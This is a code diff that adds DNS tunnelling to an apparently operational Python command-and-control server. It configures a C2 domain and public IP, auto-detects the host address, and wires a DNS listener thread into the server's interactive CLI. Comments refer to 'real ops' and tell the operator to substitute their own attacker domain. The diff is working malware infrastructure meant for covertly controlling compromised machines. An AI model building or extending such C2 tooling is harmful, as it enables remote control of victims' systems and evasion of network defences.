@@ -1,3 +1,4 @@
+import socket
 import sys
 import os
 import shlex # For splitting commands robustly
@@ -11,6 +12,7 @@ sys.path.append(os.path.join(os.path.dirname(__file__), 'utils'))
 # Import modules (will be created in subsequent steps)
 from logger import setup_logger
 from db_manager import DBManager 
+from dns_listener import DNSListener
 
 # Set up logging
 logger = setup_logger('c2_server', 'server.log')
@@ -24,7 +26,25 @@ class C2Server:
 
         self.agents = {} # In-memory cache for active agents {agent_id: agent_object}
         # In a real scenario, this would involve loading from DB and handling beaconing
+         # --- DNS Tunneling Configuration ---
+        # IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DOMAIN AND C2 SERVER'S PUBLIC IP
+        self.c2_domain = "c2.example.com" # e.g., "command.yourdomain.com"
+        # Get the C2 server's external IP automatically (best effort) or set manually
+        # This is a rough way to get your public IP; for production, set it explicitly or use a service
+        try:
+            # Use a public service to get external IP, or manually configure
+            # This needs to be the IP agents can resolve your C2_DOMAIN to
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80)) # Connect to a public DNS server
+            self.c2_ip = s.getsockname()[0]
+            s.close()
+            logger.info(f"Automatically determined C2 Server IP: {self.c2_ip}")
+        except Exception as e:
+            logger.warning(f"Could not auto-determine C2 IP, defaulting to 127.0.0.1. Error: {e}")
+            self.c2_ip = "127.0.0.1" # Fallback, you MUST change this to your public IP for real ops
 
+        self.dns_listener = DNSListener(self.c2_domain, self.c2_ip, self.db_manager)
+        # --- End DNS Tunneling Configuration ---
     def _help_command(self):
         """Displays available commands."""
         print("\nAvailable commands:")
@@ -83,7 +103,8 @@ class C2Server:
         """Starts the interactive C2 CLI."""
         print("Starting C2 Server CLI...")
         print("Type 'help' for a list of commands.")
-
+        self.dns_listener.start() # Start the DNS listener thread
+        logger.info("DNS Listener started as part of C2 server.")
         while True:
             try:
                 command_line = input("C2> ").strip()
@@ -106,6 +127,7 @@ class C2Server:
                         print("Usage: interact <agent_id>")
                 elif command == 'exit':
                     logger.info("Shutting down C2 server.")
+                    self.dns_listener.stop()
                     print("Shutting down C2 server. Goodbye!")
                     break
                 elif command == 'clear':
